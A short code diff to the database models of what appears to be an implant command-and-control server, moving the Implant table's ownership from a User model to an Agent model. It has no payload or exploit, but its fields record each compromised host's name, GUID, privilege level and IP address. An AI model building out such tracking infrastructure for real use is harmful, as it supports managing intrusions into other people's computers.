@@ -37,12 +37,6 @@ DONE = "DONE"
 
 # link to ref:https://flask-sqlalchemy.palletsprojects.com/en/2.x/models/
 # The link above contain info about dataype a column could use, and explaination about how relationship work in flask.SQLAlchemy
-class User(db.Model): # SQLAlchemy class for client
-    id = db.Column(db.Integer, primary_key=True)
-    username = db.Column(db.String(80), unique=True, nullable=False)
-    implants = db.relationship("Implant", backref='user', lazy=True)
-    def __repr__(self):
-        return '<User %r>' % self.username
 
 class Client(db.Model):
     id = db.Column(db.Integer, primary_key=True)
@@ -62,12 +56,13 @@ class Agent(db.Model): # a SQLAlchemy class
     agent_id = db.Column(db.String(288))
     username = db.Column(db.String(288))
     password = db.Column(db.String(288))
+    implants = db.relationship("Implant", backref='agent', lazy=True)
 
 class Implant(db.Model):
     id = db.Column(db.Integer, primary_key = True)
     implant_id = db.Column(db.String(288))
     computer_name = db.Column(db.String(288)) # what computer did it connect from
-    username = db.Column(db.String(80), db.ForeignKey('user.username'), nullable=False) # what user are you running as
+    username = db.Column(db.String(80), db.ForeignKey('agent.username'), nullable=False) # what user are you running as
     GUID = db.Column(db.String(288)) # computer's GUID
     Integrity = db.Column(db.String(288)) # what privileges do you have
     ip_address = db.Column(db.String(32)) # what address did the implant connect from
